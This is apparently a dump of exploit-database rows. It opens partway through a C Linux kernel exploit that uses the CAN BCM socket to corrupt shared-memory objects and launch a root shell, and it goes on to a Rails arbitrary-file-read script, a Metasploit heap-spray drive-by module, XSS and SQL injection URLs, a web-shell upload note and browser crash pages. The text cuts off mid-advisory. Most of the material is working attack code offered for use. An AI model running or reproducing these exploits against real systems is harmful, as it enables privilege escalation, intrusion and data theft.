unsigned short i_mode; 	unsigned int i_lock; 	struct mutex i_mutex; 	unsigned int i_alloc_sem_activity; 	unsigned int i_alloc_sem_wait_lock; 	struct list_head i_alloc_sem_wait_list; 	void *i_op; 	void *i_fop; 	struct super_block *i_sb; 	void *i_flock; 	void *i_mapping; 	char i_data[84]; 	void *i_dquot_1; 	void *i_dquot_2; 	struct list_head i_devices; 	void *i_pipe_union; 	unsigned int i_generation; 	unsigned int i_fsnotify_mask; 	void *i_fsnotify_mark_entries; 	struct list_head inotify_watches; 	struct mutex inotify_mutex; } inode;  struct dentry { 	unsigned int d_count; 	unsigned int d_flags; 	unsigned int d_lock; 	int d_mounted; 	void *d_inode; 	struct list_head d_hash; 	void *d_parent; } dentry;  struct file_operations { 	void *owner; 	void *llseek; 	void *read; 	void *write; 	void *aio_read; 	void *aio_write; 	void *readdir; 	void *poll; 	void *ioctl; 	void *unlocked_ioctl; 	void *compat_ioctl; 	void *mmap; 	void *open; 	void *flush; 	void *release; 	void *fsync; 	void *aio_fsync; 	void *fasync; 	void *lock; 	void *sendpage; 	void *get_unmapped_area; 	void *check_flags; 	void *flock; 	void *splice_write; 	void *splice_read; 	void *setlease; } op;  struct vfsmount { 	struct list_head mnt_hash; 	void *mnt_parent; 	void *mnt_mountpoint; 	void *mnt_root; 	void *mnt_sb; 	struct list_head mnt_mounts; 	struct list_head mnt_child; 	int mnt_flags; 	const char *mnt_devname; 	struct list_head mnt_list; 	struct list_head mnt_expire; 	struct list_head mnt_share; 	struct list_head mnt_slave_list; 	struct list_head mnt_slave; 	struct vfsmount *mnt_master; 	struct mnt_namespace *mnt_ns; 	int mnt_id; 	int mnt_group_id; 	int mnt_count; } vfsmount;  struct file { 	struct list_head fu_list; 	struct vfsmount *f_vfsmnt; 	struct dentry *f_dentry; 	void *f_op; 	unsigned int f_lock; 	unsigned long f_count; } file;  struct kern_ipc_perm { 	unsigned int lock; 	int deleted; 	int id; 	unsigned int key; 	unsigned int uid; 	unsigned int gid; 	unsigned int cuid; 	unsigned int cgid; 	unsigned int mode; 	unsigned int seq; 	void *security; };  struct shmid_kernel { 	struct kern_ipc_perm shm_perm; 	struct file *shm_file; 	unsigned long shm_nattch; 	unsigned long shm_segsz; 	time_t shm_atim; 	time_t shm_dtim; 	time_t shm_ctim; 	unsigned int shm_cprid; 	unsigned int shm_lprid; 	void *mlock_user; } shmid_kernel;  typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred); typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred); _commit_creds commit_creds; _prepare_kernel_cred prepare_kernel_cred;  int __attribute__((regparm(3))) kernel_code(struct file *file, void *vma) { 	commit_creds(prepare_kernel_cred(0)); 	return -1; }  unsigned long get_symbol(char *name) { 	FILE *f; 	unsigned long addr; 	char dummy; 	char sname[512]; 	int ret = 0, oldstyle;  	f = fopen(""/proc/kallsyms"", ""r""); 	if (f == NULL) { 		f = fopen(""/proc/ksyms"", ""r""); 		if (f == NULL) 			return 0; 		oldstyle = 1; 	}  	while (ret != EOF) { 		if (!oldstyle) { 			ret = fscanf(f, ""%p %c %s\n"", (void **) &addr, &dummy, sname); 		} else { 			ret = fscanf(f, ""%p %s\n"", (void **) &addr, sname); 			if (ret == 2) { 				char *p; 				if (strstr(sname, ""_O/"") || strstr(sname, ""_S."")) { 					continue; 				} 				p = strrchr(sname, '_'); 				if (p > ((char *) sname + 5) && !strncmp(p - 3, ""smp"", 3)) { 					p = p - 4; 					while (p > (char *)sname && *(p - 1) == '_') { 						p--; 					} 					*p = '\0'; 				} 			} 		} 		if (ret == 0) { 			fscanf(f, ""%s\n"", sname); 			continue; 		} 		if (!strcmp(name, sname)) { 			printf(""[+] resolved symbol %s to %p\n"", name, (void *) addr); 			fclose(f); 			return addr; 		} 	} 	fclose(f);  	return 0; }  int check_slabinfo(char *cache, int *active_out, int *total_out) { 	FILE *fp; 	char name[64], slab[256]; 	int active, total, diff;  	memset(slab, 0, sizeof(slab)); 	memset(name, 0, sizeof(name));  	fp = fopen(""/proc/slabinfo"", ""r""); 	if (!fp) { 		printf(""[-] sorry, /proc/slabinfo is not available!""); 		exit(1); 	}  	fgets(slab, sizeof(slab) - 1, fp); 	while (1) { 		fgets(slab, sizeof(slab) - 1, fp); 		sscanf(slab, ""%s %u %u"", name, &active, &total); 		diff = total - active; 		if (strcmp(name, cache) == 0) { 			break; 		} 	} 	fclose(fp);  	if (active_out) { 		*active_out = active; 	} 	if (total_out) { 		*total_out = total; 	} 	return diff; }  void trigger(void) { 	int *shmids; 	int i, ret, sock, cnt, base, smashed; 	int diff, active, total, active_new, total_new; 	int len, sock_len, mmap_len; 	struct sockaddr_can addr; 	struct bcm_msg_head *msg; 	void *efault; 	char *buf;  	printf(""[+] creating PF_CAN socket...\n"");  	sock = socket(PF_CAN, SOCK_DGRAM, CAN_BCM); 	if (sock < 0) { 		printf(""[-] kernel lacks CAN packet family support\n""); 		exit(1); 	}  	printf(""[+] connecting PF_CAN socket...\n"");  	memset(&addr, 0, sizeof(addr)); 	addr.can_family = PF_CAN;  	ret = connect(sock, (struct sockaddr *) &addr, sizeof(addr)); 	if (sock < 0) { 		printf(""[-] could not connect CAN socket\n""); 		exit(1); 	}  	len = MHSIZ + (CFSIZ * (ALLOCATION / 16)); 	msg = malloc(len); 	memset(msg, 0, len); 	msg->can_id = 2959; 	msg->nframes = (UINT_MAX / CFSIZ) + (ALLOCATION / 16) + 1;  	printf(""[+] clearing out any active OPs via RX_DELETE...\n""); 	 	msg->opcode = RX_DELETE; 	ret = send(sock, msg, len, 0);  	printf(""[+] removing any active user-owned shmids...\n"");  	system(""for shmid in `cat /proc/sysvipc/shm | awk '{print $2}'`; do ipcrm -m $shmid > /dev/null 2>&1; done;"");  	printf(""[+] massaging "" SLUB "" SLUB cache with dummy allocations\n"");  	diff = check_slabinfo(SLUB, &active, &total);  	shmids = malloc(sizeof(int) * diff * 10);  	cnt = diff * 10; 	for (i = 0; i < cnt; ++i) { 		diff = check_slabinfo(SLUB, &active, &total); 		if (diff == 0) { 			break; 		} 		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT); 	} 	base = i;  	if (diff != 0) { 		printf(""[-] inconsistency detected with SLUB cache allocation, please try again\n""); 		exit(1); 	}  	printf(""[+] corrupting BCM OP with truncated allocation via RX_SETUP...\n"");  	i = base; 	cnt = i + FILLER; 	for (; i < cnt; ++i) { 		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT); 	}  	msg->opcode = RX_SETUP; 	ret = send(sock, msg, len, 0); 	if (ret < 0) { 		printf(""[-] kernel rejected malformed CAN header\n""); 		exit(1); 	}  	i = base + FILLER; 	cnt = i + FILLER; 	for (; i < cnt; ++i) { 		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT); 	}  	printf(""[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...\n"");  	mmap_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 3); 	sock_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 4); 	efault = mmap(NULL, mmap_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);  	printf(""[+] mmap'ed mapping of length %d at %p\n"", mmap_len, efault);  	printf(""[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...\n"");  	msg = (struct bcm_msg_head *) efault; 	memset(msg, 0, mmap_len); 	msg->can_id = 2959; 	msg->nframes = (ALLOCATION / 16) * 4;  	msg->opcode = RX_SETUP; 	ret = send(sock, msg, mmap_len, 0); 	if (ret != -1 && errno != EFAULT) { 		printf(""[-] couldn't trigger EFAULT, exploit aborting!\n""); 		exit(1); 	}  	printf(""[+] seeking out the smashed shmid_kernel...\n"");  	i = base; 	cnt = i + FILLER + FILLER; 	for (; i < cnt; ++i) { 		ret = (int) shmat(shmids[i], NULL, SHM_RDONLY); 		if (ret == -1 && errno == EIDRM) { 			smashed = i; 			break; 		} 	} 	if (i == cnt) { 		printf(""[-] could not find smashed shmid, trying running the exploit again!\n""); 		exit(1); 	} 	 	printf(""[+] discovered our smashed shmid_kernel at shmid[%d] = %d\n"", i, shmids[i]);  	printf(""[+] re-smashing the shmid_kernel with exploit payload...\n"");  	shmid_kernel.shm_perm.seq = shmids[smashed] / IPCMNI;  	buf = (char *) msg; 	memcpy(&buf[MHSIZ + (ALLOCATION * 2) + HDRLEN_KMALLOC], &shmid_kernel, sizeof(shmid_kernel));   	msg->opcode = RX_SETUP; 	ret = send(sock, msg, mmap_len, 0); 	if (ret != -1 && errno != EFAULT) { 		printf(""[-] couldn't trigger EFAULT, exploit aborting!\n""); 		exit(1); 	} 	 	ret = (int) shmat(shmids[smashed], NULL, SHM_RDONLY); 	if (ret == -1 && errno != EIDRM) { 		setresuid(0, 0, 0); 		setresgid(0, 0, 0);  		printf(""[+] launching root shell!\n"");  		execl(""/bin/bash"", ""/bin/bash"", NULL); 		exit(0); 	}  	printf(""[-] exploit failed! retry?\n""); }  void setup(void) { 	printf(""[+] looking for symbols...\n"");  	commit_creds = (_commit_creds) get_symbol(""commit_creds""); 	if (!commit_creds) { 		printf(""[-] symbol table not availabe, aborting!\n""); 	}  	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol(""prepare_kernel_cred""); 	if (!prepare_kernel_cred) { 		printf(""[-] symbol table not availabe, aborting!\n""); 	}  	printf(""[+] setting up exploit payload...\n"");  	super_block.s_flags = 0;  	inode.i_size = 4096; 	inode.i_sb = &super_block; 	inode.inotify_watches.next = &inode.inotify_watches; 	inode.inotify_watches.prev = &inode.inotify_watches; 	inode.inotify_mutex.count = 1;  	dentry.d_count = 4096; 	dentry.d_flags = 4096; 	dentry.d_parent = NULL; 	dentry.d_inode = &inode;  	op.mmap = &kernel_code; 	op.get_unmapped_area = &kernel_code;  	vfsmount.mnt_flags = 0; 	vfsmount.mnt_count = 1;  	file.fu_list.prev = &file.fu_list; 	file.fu_list.next = &file.fu_list; 	file.f_dentry = &dentry; 	file.f_vfsmnt = &vfsmount; 	file.f_op = &op;  	shmid_kernel.shm_perm.key = IPC_PRIVATE; 	shmid_kernel.shm_perm.uid = getuid(); 	shmid_kernel.shm_perm.gid = getgid(); 	shmid_kernel.shm_perm.cuid = getuid(); 	shmid_kernel.shm_perm.cgid = getgid(); 	shmid_kernel.shm_perm.mode = -1; 	shmid_kernel.shm_file = &file; }  int main(int argc, char **argv) { 	setup(); 	trigger(); 	return 0; }",local,local,1
33504,BOA Web Server 0.94.x - Terminal Escape Sequence in Logs Command Injection source: https://www.securityfocus.com/bid/37718/info  Boa Webserver is prone to a command-injection vulnerability because it fails to adequately sanitize user-supplied input in logfiles.  Attackers can exploit this issue to execute arbitrary commands in a terminal.  Boa Webserver 0.94.14rc21 is vulnerable; other versions may also be affected.  curl -kis http://www.example.com/%1b%5d%32%3b%6f%77%6e%65%64%07%0a,remote,remote,1
46585,"Rails 5.2.1 - Arbitrary File Content Disclosure ''' Exploit Title: File Content Disclosure on Rails Date: CVE disclosed 3/16 today's date is 3/20 Exploit Author: NotoriousRebel Vendor Homepage: https://rubyonrails.org/ Software Link: https://github.com/rails/rails Version: Versions Affected: all Fixed Versions: 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1 Tested on: Rails 5.2.1 (Using ubuntu on linux subsystem for Windows) CVE: 2019-5418 ''' import sys  try:     import requests except ImportError:     print('\n\033[93m[!] Requests library not found, please install before proceeding.\n\n \033[0m')     sys.exit(1)   def banner():     banner = """"""     ----------------------------------------------     Arbitrary Traversal exploit for Ruby on Rails     CVE-2019-5418     ----------------------------------------------     """"""     print(banner)  def check_args():     if len(sys.argv) != 2:         print(""Invalid number of arguments entered!"")         how_to_use = ""python3 Bandit.py url""         print('Use as:', how_to_use)         sys.exit(1)   def check_url(url):     status_code = requests.get(url)     if status_code != 200:         print(""Url is invalid or can not be reached!"")         sys.exit(1)   def read_file(url, file):     headers = {'Accept': file + '{{'}     req = requests.get(url, headers=headers)     return req   def main():     banner()     check_args()     url = sys.argv[1]     while True:         try:             file = input(""Enter file to read (enter quit to exit): "")         except Exception:             file = raw_input(""Enter file to read (enter quit to exit): "")         try:             if file.lower() == 'quit':                 break         except Exception:             if file == 'quit':                 break         response = read_file(url, file)         print(response.text)   if __name__ == '__main__':     try:         main()     except KeyboardInterrupt:         print('\n\n\033[93m[!] ctrl+c detected from user, quitting.\n\n \033[0m')",remote,webapps,1
28699,"CubeCart 3.0.x - '/admin/print_order.php?order_id' Cross-Site Scripting source: https://www.securityfocus.com/bid/20215/info     CubeCart is prone to multiple input-validation vulnerabilities, including information-disclosure, cross-site scripting, and SQL-injection issues, because the application fails to properly sanitize user-supplied input.      A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.    http://www.example.com/admin/print_order.php?order_id=<script>alert(document.cookie);</script>",remote,webapps,1
9086,MRCGIGUY Thumbnail Gallery Post 1b - Arbitrary File Upload ################################################################################################################# [+] MRCGIGUY Thumbnail Gallery Post 1b Remote File Upload Vuln [+] Discovered By ThE g0bL!N [+] Vendor:http://www.mrcgiguy.com/ [+} Download:http://www.mrcgiguy.com/cgi-bin/freedown.cgi?id=6 [+] Greets : SarBoT511 -Sub-ZeRo [+] Note: It is a Sex Site Thanx God For This Bug :) ################################################################################################################# Exploit: -------   1)Go To add Your Picture http://www.site.com/path/submit.cgi   2) Upload Your Shell.php   3) Image Properties And The link Of shell :)  Exapmle:  -------  http://site.com/upload/68456_shell1.php  Demo:  ---- http://www.myhotlinks.net/cgi-bin/tgp/submit.cgi    Hack it please :d ################################################################################################################  # milw0rm.com [2009-07-09],remote,webapps,1
30455,"Microsoft Internet Explorer 6 - Position:Relative Denial of Service source: https://www.securityfocus.com/bid/25222/info  Microsoft Internet Explorer is prone to a denial-of-service vulnerability because the application fails to handle certain HTML code.  This issue is triggered when a remote attacker entices a victim user to visit a malicious website.  Attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.  This issue affects Internet Explorer 6.   <!-- 	Easy IE Crash by Hamachiya2  (http://hamachiya.com/junk/ie_crash.html) -->  <style>*{position:relative}</style><table><input>",remote,dos,1
11768,"Newbie CMS - File Disclosure   |=-----------------------------------------------------=|   |=-------------=[  JIKO |No-exploit.Com|  ]=-----------=|   |=-----------------------------------------------------=| [~]-----------|00| NAme    :JIKO (JAWAD) Home    :No-exploit.Com Mail    : !x! [~]-----------|01|     -{Script}     name :Newbie CMS     link :http://newbie-cms.com/  [~]-----------|02|     -{3xpl01t}     http://no-exploit.com/free_download.php?file={FILE} [~]-----------|03|     -{Greetz}     Cyber-Zone,HxH,Hussin X,ZaIdOoHxHaCkEr ,Stack,HiSoKa,The SadHacker,SkuLL-HacKeR ,Dr.NaNo     |No-Exploit.com Members -------------------------------------",remote,webapps,1
16615,"Microsoft DirectShow - 'msvidctl.dll' MPEG-2 Memory Corruption (MS09-032/MS09-037) (Metasploit) ## # $Id: msvidctl_mpeg2.rb 9179 2010-04-30 08:40:19Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  ## # msvidctl_mpeg2.rb # # Microsoft DirectShow (msvidctl.dll) MPEG-2 Memory Corruption exploit for the Metasploit Framework # # Tested successfully on the following platforms (fully patched 06/07/09): #  - Internet Explorer 6, Windows XP SP2 #  - Internet Explorer 7, Windows XP SP3 # # Original exploit was found in-the-wild used to preform drive-by attacks via compromised Chinese web sites. # The original exploit can be found here (shellcode changed to execute calc.exe): # http://www.rec-sec.com/exploits/aa.rar # # Trancer # http://www.rec-sec.com ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Microsoft DirectShow (msvidctl.dll) MPEG-2 Memory Corruption', 			'Description'    => %q{ 					This module exploits a memory corruption within the MSVidCtl component of Microsoft 				DirectShow (BDATuner.MPEG2TuneRequest). 				By loading a specially crafted GIF file, an attacker can overrun a buffer and 				execute arbitrary code.  				ClassID is now configurable via an advanced option (otherwise randomized) - I)ruid 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'Trancer <mtrancer[at]gmail.com>' ], 			'Version'        => '$Revision: 9179 $', 			'References'     => 				[ 					[ 'CVE', '2008-0015' ], 					[ 'OSVDB', '55651' ], 					[ 'BID', '35558' ], 					[ 'MSB', 'MS09-032' ], 					[ 'MSB', 'MS09-037' ], 					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/972890.mspx' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'         => 1024, 					'BadChars'      => ""\x00\x09\x0a\x0d'\\"", 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C } ] 				], 			'DisclosureDate' => 'Jul 05 2009', 			'DefaultTarget'  => 0))  		register_advanced_options( 			[ 				OptString.new('ClassID', [ false, ""Specific ClassID to use (otherwise randomized)"", nil ]), 			], self.class)  		@javascript_encode_key = rand_text_alpha(rand(10) + 10) 	end  	def on_request_uri(cli, request)  		if (request.uri.match(/\.gif$/i))  			print_status(""Sending GIF to #{cli.peerhost}:#{cli.peerport}..."")  			gif =  ""\x00\x03\x00\x00\x11\x20\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" 			gif << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" 			gif << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" 			gif << ""\xFF\xFF\xFF\xFF""	# End of SEH chain 			gif << [target.ret].pack('V')	# SE Handler 			gif << ""\x00""  			send_response(cli, gif, { 'Content-Type' => 'image/gif' })  			return 		end  		if (!request.uri.match(/\?\w+/)) 			send_local_redirect(cli, ""?#{@javascript_encode_key}"") 			return 		end  		print_status(""Sending HTML to #{cli.peerhost}:#{cli.peerport}..."")  		# Re-generate the payload 		return if ((p = regenerate_payload(cli)) == nil)  		# Class IDs 		allclsids = [ # all IDs from the advisory 			""011B3619-FE63-4814-8A84-15A194CE9CE3"", # doesn't work 			""0149EEDF-D08F-4142-8D73-D23903D21E90"", # doesn't work 			""0369B4E5-45B6-11D3-B650-00C04F79498E"", # works 			""0369B4E6-45B6-11D3-B650-00C04F79498E"", # works 			""055CB2D7-2969-45CD-914B-76890722F112"", # works 			""0955AC62-BF2E-4CBA-A2B9-A63F772D46CF"", # works 			""15D6504A-5494-499C-886C-973C9E53B9F1"", # works 			""1BE49F30-0E1B-11D3-9D8E-00C04F72D980"", # doesn't work 			""1C15D484-911D-11D2-B632-00C04F79498E"", # doesn't work 			""1DF7D126-4050-47F0-A7CF-4C4CA9241333"", # doesn't work 			""2C63E4EB-4CEA-41B8-919C-E947EA19A77C"", # doesn't work 			""334125C0-77E5-11D3-B653-00C04F79498E"", # doesn't work 			""37B0353C-A4C8-11D2-B634-00C04F79498E"", # doesn't work 			""37B03543-A4C8-11D2-B634-00C04F79498E"", # doesn't work 			""37B03544-A4C8-11D2-B634-00C04F79498E"", # doesn't work 			""418008F3-CF67-4668-9628-10DC52BE1D08"", # doesn't work 			""4A5869CF-929D-4040-AE03-FCAFC5B9CD42"", # doesn't work 			""577FAA18-4518-445E-8F70-1473F8CF4BA4"", # doesn't work 			""59DC47A8-116C-11D3-9D8E-00C04F72D980"", # works 			""7F9CB14D-48E4-43B6-9346-1AEBC39C64D3"", # doesn't work 			""823535A0-0318-11D3-9D8E-00C04F72D980"", # doesn't work 			""8872FF1B-98FA-4D7A-8D93-C9F1055F85BB"", # doesn't work 			""8A674B4C-1F63-11D3-B64C-00C04F79498E"", # works 			""8A674B4D-1F63-11D3-B64C-00C04F79498E"", # works 			""9CD64701-BDF3-4D14-8E03-F12983D86664"", # doesn't work 			""9E77AAC4-35E5-42A1-BDC2-8F3FF399847C"", # doesn't work 			""A1A2B1C4-0E3A-11D3-9D8E-00C04F72D980"", # doesn't work 			""A2E3074E-6C3D-11D3-B653-00C04F79498E"", # doesn't work 			""A2E30750-6C3D-11D3-B653-00C04F79498E"", # works 			""A8DCF3D5-0780-4EF4-8A83-2CFFAACB8ACE"", # doesn't work 			""AD8E510D-217F-409B-8076-29C5E73B98E8"", # doesn't work 			""B0EDF163-910A-11D2-B632-00C04F79498E"", # doesn't work 			""B64016F3-C9A2-4066-96F0-BD9563314726"", # works 			""BB530C63-D9DF-4B49-9439-63453962E598"", # doesn't work 			""C531D9FD-9685-4028-8B68-6E1232079F1E"", # doesn't work 			""C5702CCC-9B79-11D3-B654-00C04F79498E"", # doesn't work 			""C5702CCD-9B79-11D3-B654-00C04F79498E"", # doesn't work 			""C5702CCE-9B79-11D3-B654-00C04F79498E"", # doesn't work 			""C5702CCF-9B79-11D3-B654-00C04F79498E"", # doesn't work 			""C5702CD0-9B79-11D3-B654-00C04F79498E"", # doesn't work 			""C6B14B32-76AA-4A86-A7AC-5C79AAF58DA7"", # works 			""CAAFDD83-CEFC-4E3D-BA03-175F17A24F91"", # doesn't work 			""D02AAC50-027E-11D3-9D8E-00C04F72D980"", # doesn't work 			""F9769A06-7ACA-4E39-9CFB-97BB35F0E77E"", # works 			""FA7C375B-66A7-4280-879D-FD459C84BB02"", # doesn't work 		] 		clsids = [ # these all work 			""0369B4E5-45B6-11D3-B650-00C04F79498E"", # works 			""0369B4E6-45B6-11D3-B650-00C04F79498E"", # works 			""055CB2D7-2969-45CD-914B-76890722F112"", # works 			""0955AC62-BF2E-4CBA-A2B9-A63F772D46CF"", # works 			""15D6504A-5494-499C-886C-973C9E53B9F1"", # works 			""59DC47A8-116C-11D3-9D8E-00C04F72D980"", # works 			""8A674B4C-1F63-11D3-B64C-00C04F79498E"", # works 			""8A674B4D-1F63-11D3-B64C-00C04F79498E"", # works 			""A2E30750-6C3D-11D3-B653-00C04F79498E"", # works 			""B64016F3-C9A2-4066-96F0-BD9563314726"", # works 			""C6B14B32-76AA-4A86-A7AC-5C79AAF58DA7"", # works 			""F9769A06-7ACA-4E39-9CFB-97BB35F0E77E"", # works 		] 		classid = datastore['ClassID'] || clsids[rand(clsids.size)]  		# Encode the shellcode 		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))  		# Setup exploit buffers 		nops 	  = Rex::Text.to_unescape([target.ret].pack('V')) 		blocksize = 0x40000 		fillto    = 500  		# Randomize the javascript variable names 		msvidctl     = rand_text_alpha(rand(100) + 1) 		div	     = rand_text_alpha(rand(100) + 1) 		j_shellcode  = rand_text_alpha(rand(100) + 1) 		j_nops       = rand_text_alpha(rand(100) + 1) 		j_headersize = rand_text_alpha(rand(100) + 1) 		j_slackspace = rand_text_alpha(rand(100) + 1) 		j_fillblock  = rand_text_alpha(rand(100) + 1) 		j_block      = rand_text_alpha(rand(100) + 1) 		j_memory     = rand_text_alpha(rand(100) + 1) 		j_counter    = rand_text_alpha(rand(30) + 2)  		host = Rex::Socket.source_address(cli.peerhost) + "":"" + datastore[""SRVPORT""] 		gif_uri = ""http#{(datastore['SSL'] ? 's' : '')}://#{host}"" 		if (""/"" == get_resource[-1,1]) 			gif_uri << get_resource[0, get_resource.length - 1] 		else 			gif_uri << get_resource 		end 		gif_uri << ""/"" + Time.now.to_i.to_s + "".gif""  		js = %Q|#{j_shellcode}=unescape('#{shellcode}'); #{j_nops}=unescape('#{nops}'); #{j_headersize}=20; #{j_slackspace}=#{j_headersize}+#{j_shellcode}.length; while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops}; #{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace}); #{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace}); while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock}; #{j_memory}=new Array(); for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};  var #{msvidctl}=document.createElement('object'); #{div}.appendChild(#{msvidctl}); #{msvidctl}.width='1'; #{msvidctl}.height='1'; #{msvidctl}.data='#{gif_uri}'; #{msvidctl}.classid='clsid:#{classid}';|  		js_encoded = encrypt_js(js, @javascript_encode_key)  		html = %Q|<html> <body> <div id=""#{div}""> <script> #{js_encoded} </script> </body> </html>|  		print_status(""Sending exploit to #{cli.peerhost}:#{cli.peerport}..."")  		# Transmit the response to the client 		send_response(cli, html, { 'Content-Type' => 'text/html' })  		# Handle the payload 		handler(cli) 	end  end",local,local,1
27103,PowerPortal 1.1/1.3 - 'search.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/16279/info   PowerPortal is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/modules/content/search.php?func=results&search=[XSS] http://www.example.com/modules/content/search.php?search=[XSS]&func=results,remote,webapps,1
22280,"Microsoft Outlook2000/Express 6.0 - Arbitrary Program Execution source: https://www.securityfocus.com/bid/6923/info  Microsoft Outlook and Outlook Express may execute arbitrary programs through objects embedded in HTML email messages. When an email message or newsgroup message is viewed using Outlook, a temporary object is created in the Internet Explorer cache. The security zone of this cache should be set by Internet Explorer and is set to the Internet Zone by default.  It is possible to have an object embedded in an HTML message reference an executable file using a CODEBASE reference and non-zero CLASSID value. It may also be possible for an attacker to place a file in a known temporary folder and have it executed through this method.  An issue similar to this was reported for Internet Explorer (BID 3867). It appears that the issue was fixed for objects viewed in a web page through Internet Explorer, but not through HTML email viewed with Outlook or Outlook Express.   <xml id=oExec> <security><exploit> <![CDATA[ <object id=""oFile"" classid=""clsid:11111111-1111-1111-1111"" code base=""C:WINDOWSFTP.EXE""></object>]]></exploit></security></xml> <SPAN dataFld=exploit dataFormatAs=html dataSrc=#oExec></SPAN>",remote,remote,1
26350,"PunBB 1.2.x - 'search.php' SQL Injection source: https://www.securityfocus.com/bid/15114/info  PunBB is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/search.php?action=search&keywords=&author=d3vilbox&forum=-1&search_in=all&sort_by=0&sort_dir=DESC&show_as=topics&search=Submit&old_searches[]=[sql-injection]",remote,webapps,1
37461,"DigPHP - 'dig.php' Script Remote File Disclosure source: https://www.securityfocus.com/bid/54207/info  DigPHP is prone to a remote file-disclosure vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to view local files in the context of the web server process, which may aid in further attacks.   http://www.example.com/dig.php?action=file&dir=",remote,webapps,1
9160,"Multiple Browsers - Denial of Service ________________________________________________________________________                       One bug to rule them all        IE5,IE6,IE7,IE8,Netscape,Firefox,Safari,Opera,Konqueror,        Seamonkey,Wii,PS3,iPhone,iPod,Nokia,Siemens.... and more.                Don't wet your pants - it's DoS only ________________________________________________________________________  Release mode: Tried hard to coordinate - gave up Reference   : [GSEC-TZO-26-2009] - One bug to rule them all WWW         : http://www.g-sec.lu/one-bug-to-rule-them-all.html Vendors         :  http://www.firefox.com    http://www.apple.com http://www.opera.com http://www.sony.com http://www.nintendo.com http://www.nokia.com http://www.siemens.com others.. Status      : Varies CVE         : CVE-2009-1692 (created by apple same root cause) Credit      : Except Apple - nobody  Affected products :  ~~~~~~~~~~~~~~~~~ - Internet Explorer 5, 6, 7, 8 (all versions) - Chrome (limited) - Opera  - Seamonkey - Midbrowser - Netscape 6 & 8 (9 years ago) - Konqueror (all versions) - Apple iPhone + iPod  - Apple Safari - Thunderbird - Nokia Phones : Nokia N95 (Symbian OS v.9.2),Nokia N82, Nokia N810 Internet Tablet - Aigo P8860 (Browser hangs and cannot be restarted)   - Siemens phones - Google T-Mobile G1 TC4-RC30 - Ubuntu (Operating system sometimes reboots, memory management failure) - possibly more devices and products that support Javascript, try it yourselves. POC here : http://www.crashthisthing.com/select.html  Patch availability : ~~~~~~~~~~~~~~~~~~ - Mozilla : Fixed in Firefox 3.0.5 and 2.0.0.19  https://bugzilla.mozilla.org/show_bug.cgi?id=460713 - Apple iPhone&iPod : patched - IE : No patch for IE5, IE6, IE7, IE8 until IE9 - Webkit : Patched in r41741 - https://bugs.webkit.org/show_bug.cgi?id=23319 - Chrome : Patched, unknown which version) - Opera : Patched after version 9.64 - Thunderbird (unknown) - Konqueror : unknown (did not respond) - Nokia : unknown, opened a case but never came back - Aigo P8860 : unknown - Siemens : unknown - Others ? Find out by visiting the POC at http://crashthisthing.com/select.html   I. Background ~~~~~~~~~~~ Quoting Wikipedia ""ECMAScript is a scripting language, standardized by Ecma  International in the ECMA-262 specification and ISO/IEC 16262. The language  is widely used on the web, especially in the form of its three best-known  dialects, JavaScript, ActionScript, and JScript.""   II. Description ~~~~~~~~~~~~~ Calling the select() method with a large integer, results in continuos allocation of x+n bytes of memory  exhausting memory after a while.  The impact varies from null pointer dereference (no more memory,hence  crashing the browser) to the reboot of the complete Operation System  (Konqueror&Ubuntu)  There had never been a limit specified as to how many html elements the select call should handle, after the report of this Bug, vendors apparently agreed to a  limit of 10.000 elements : ""Talked to some 